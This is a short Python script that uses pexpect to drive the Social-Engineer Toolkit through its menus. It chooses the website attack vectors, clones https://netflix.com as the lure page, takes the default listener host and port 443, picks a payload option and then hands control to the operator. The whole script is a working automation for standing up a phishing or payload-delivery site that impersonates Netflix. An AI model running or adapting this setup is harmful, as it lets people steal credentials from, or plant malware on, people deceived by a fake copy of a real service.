import pexpect

def setoolkit():
        setoolkit = pexpect.spawn("/opt/set/setoolkit", encoding="utf-8")
        #logfile = open('setlog','w')
        #setoolkit.logfile_send = logfile
        setoolkit.expect('set>*')
        setoolkit.sendline('1')
        setoolkit.expect('set>*')
        setoolkit.sendline('2')
        setoolkit.expect('webattack>*')
        setoolkit.sendline('7')
        setoolkit.expect('webattack>*')
        setoolkit.sendline('2')
        setoolkit.expect_exact('Enter the url to clone:')
        setoolkit.sendline('https://netflix.com')
        setoolkit.expect('(LHOST)*')
        setoolkit.sendline()
        setoolkit.expect('[443]:*')
        setoolkit.sendline()
        setoolkit.expect('[1-3]:*')
        setoolkit.sendline('3')
        setoolkit.interact()
setoolkit()
